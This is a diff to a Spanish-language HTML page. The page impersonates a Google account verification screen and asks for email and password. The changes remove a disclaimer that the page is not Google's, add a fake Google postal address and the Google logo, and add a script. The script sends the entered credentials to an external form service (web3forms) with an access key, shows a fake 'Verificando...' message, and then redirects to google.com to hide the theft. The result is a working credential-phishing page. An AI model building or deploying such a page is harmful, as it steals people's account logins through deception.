@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificación de Cuenta - Gmail</title>
+    <title>Verificación de Cuenta</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -18,8 +18,9 @@
             background-color: white;
             padding: 40px;
             border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            width: 320px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
             text-align: center;
         }
         .logo {
@@ -28,29 +29,25 @@
         }
         h2 {
             color: #202124;
-            font-size: 24px;
             margin-bottom: 10px;
-            font-weight: 500;
         }
         p {
             color: #5f6368;
             font-size: 14px;
-            margin-bottom: 30px;
-            line-height: 1.5;
+            margin-bottom: 20px;
         }
-        input[type="email"], input[type="password"] {
+        input {
             width: 100%;
-            padding: 13px 15px;
-            margin-bottom: 16px;
+            padding: 12px;
+            margin: 10px 0;
             border: 1px solid #dadce0;
             border-radius: 4px;
+            box-sizing: border-box;
             font-size: 16px;
-            box-sizing: border-box; /* Para que el padding no rompa el ancho */
         }
         input:focus {
             border-color: #1a73e8;
             outline: none;
-            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
         }
         button {
             background-color: #1a73e8;
@@ -59,9 +56,10 @@
             padding: 12px 24px;
             border-radius: 4px;
             font-size: 14px;
-            font-weight: 500;
+            font-weight: bold;
             cursor: pointer;
             width: 100%;
+            margin-top: 20px;
         }
         button:hover {
             background-color: #1765cc;
@@ -71,33 +69,70 @@
             font-size: 12px;
             color: #999;
         }
+        .error {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <!-- Logo de Google (SVG simplificado) -->
-    <svg class="logo" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.58-2.38 4.13-5.94 4.13-9.89z" fill="#4285F4"/>
-        <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
-        <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.26 1.03-1.03z" fill="#FBBC05"/>
-        <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
-    </svg>
-
-    <h2>Verificar tu identidad</h2>
-    <p>Para continuar con la verificación de tu cuenta, por favor ingresa tu correo y contraseña.</p>
-
-    <!-- El formulario envía los datos a 'recibe_datos.php' -->
-    <form action="https://formspree.io/f/meajlgyw" method="POST">
-        <input type="email" name="email" placeholder="Correo electrónico" required>
-        <input type="password" name="password" placeholder="Contraseña" required>
-        <button type="submit">Siguiente</button>
-    </form>
-    
-    <div class="footer">
-        <p>Esta página no es parte de Google. Los datos se capturan para verificación.</p>
+    <div class="container">
+        <!-- Logo de Google genérico -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google" class="logo">
+        
+        <h2>Verificación de seguridad</h2>
+        <p>Para continuar, por favor confirma tu identidad.</p>
+        
+        <form action="https://api.web3forms.com/submit" method="POST">
+            <input type="hidden" name="access_key" value="ddd3f715-0709-403e-8076-087352cbfef2">
+            <input type="hidden" name="redirect" value="https://santino-c.github.io/verificacion-gmail/?status=success">
+            
+            <input type="email" name="email" placeholder="Correo electrónico" required>
+            <input type="password" name="password" placeholder="Contraseña" required>
+            
+            <button type="submit">Siguiente</button>
+            
+            <p class="error" id="errorMsg">Por favor, completa todos los campos.</p>
+        </form>
+        
+        <div class="footer">
+            Google, Inc. • 1600 Amphitheatre Parkway, Mountain View, CA 94043, USA
+        </div>
     </div>
-</div>
 
+    <script>
+        // Script para manejar el envío y redirección si quieres que se vea profesional
+        const form = document.querySelector('form');
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const formData = new FormData(form);
+            const object = Object.fromEntries(formData);
+            const json = JSON.stringify(object);
+            
+            const response = await fetch("https://api.web3forms.com/submit", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                    "Accept": "application/json"
+                },
+                body: json
+            }).then((response) => response.json());
+
+            if (response.success) {
+                // Simular carga y redirigir para que parezca que está verificando
+                document.querySelector('button').innerText = "Verificando...";
+                document.querySelector('button').disabled = true;
+                
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com"; // O una página de 'Éxito' propia
+                }, 2000);
+            } else {
+                document.getElementById('errorMsg').style.display = 'block';
+            }
+        });
+    </script>
 </body>
 </html>
